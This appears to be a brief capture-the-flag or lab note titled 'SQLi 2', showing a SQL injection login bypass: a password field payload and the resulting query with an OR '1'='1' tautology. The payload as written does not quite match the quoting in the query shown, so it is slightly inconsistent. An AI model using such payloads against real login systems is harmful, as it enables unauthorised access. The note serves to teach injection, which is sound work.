# SQLi 2

User: `admin`
Password: `'pass OR '1'='1`

SQL Query formed:

```sql
SELECT rowid, * FROM users WHERE username = 'admin' AND password = 'pass' OR '1'='1'
```
